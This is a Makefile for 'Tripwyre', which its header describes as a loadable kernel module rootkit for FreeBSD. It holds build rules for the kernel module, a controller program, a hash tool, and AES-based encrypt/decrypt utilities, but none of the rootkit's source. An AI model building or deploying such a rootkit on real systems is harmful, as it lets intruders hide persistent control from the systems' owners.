# Tripwyre - A Loadable Kernel Module (LKM) Rootkit for FreeBSD
# Author: Satish Srinivasan (sathya@freeshell.org)
#
# Makefile - Used for building tripwyre and controller

KMOD=	tripwyre		
SRCS=	options.h module.c	

.include <bsd.kmod.mk>

controller: controller_options.h controller.c
	cc -g -o controller controller.c -lcurses -lcrypt

compute_hash: controller_options.h compute_hash.c
	cc -o compute_hash compute_hash.c -lcrypt

compclean:
	rm compute_hash

cclean:	
	rm controller

cdecrypt:
	rm decrypt

cencrypt:
	rm encrypt

decrypt: decrypt.c rijndael.c
	cc -o decrypt decrypt.c rijndael.c

encrypt: encrypt.c rijndael.c
	cc -o encrypt encrypt.c rijndael.c
